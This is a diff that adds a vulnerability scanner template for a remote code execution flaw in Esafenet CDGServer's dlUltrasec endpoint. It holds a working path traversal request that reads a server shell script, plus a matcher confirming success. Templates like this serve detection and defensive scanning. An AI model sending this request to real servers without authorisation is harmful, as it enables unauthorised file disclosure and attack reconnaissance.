@@ -1,0 +1,22 @@
+id: esafenet-cdgserver-dlultrasec-rce
+info:
+  name: 亿赛通 CDGServer dlultrasec 接口 - 远程代码执行漏洞
+  author: Chaitin
+  severity: critical
+  reference:
+  - https://stack.chaitin.com/vuldb/detail/5e342f19-6c88-4f8f-8373-8fbc88728e51
+  metadata:
+    verified: true
+    max-request: 1
+    vuln-id: CT-1002008
+    vendor: esafenet
+    product: cdgserver
+  tags: rce,vuln,esafenet
+http:
+- method: GET
+  path:
+  - '{{BaseURL}}/linuxUpdate/dlUltrasec?path=../../../../../../../../../esafenet/fileServer/fileServer.sh&type=1'
+  matchers:
+  - type: dsl
+    dsl:
+    - 'contains(body, ''fileServer.jar'') && contains(body, ''/bin/bash'')'
